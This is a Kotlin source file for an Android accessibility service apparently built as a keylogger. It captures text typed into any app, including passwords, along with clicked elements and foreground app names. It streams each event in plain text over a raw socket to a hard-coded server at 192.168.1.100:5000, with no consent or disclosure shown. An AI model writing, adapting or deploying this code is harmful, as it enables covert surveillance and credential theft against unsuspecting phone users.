package com.accessapp

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.BufferedWriter
import java.io.OutputStreamWriter
import java.net.Socket
import kotlin.concurrent.thread

class AccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "AccessibilityMonitor"
        private const val SERVER_HOST = "192.168.1.100"
        private const val SERVER_PORT = 5000
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val message = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TextChanged: ${event.text.joinToString()}"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "Clicked: ${event.source?.contentDescription}"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "Window: ${event.packageName}"
            else -> "Event: ${event.eventType}"
        }

        Log.d(TAG, message)
        sendToServer(message)
    }

    private fun sendToServer(data: String) {
        thread {
            try {
                Socket(SERVER_HOST, SERVER_PORT).use { socket ->
                    BufferedWriter(OutputStreamWriter(socket.getOutputStream())).use { writer ->
                        writer.write("$data\n")
                        writer.flush()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }
}
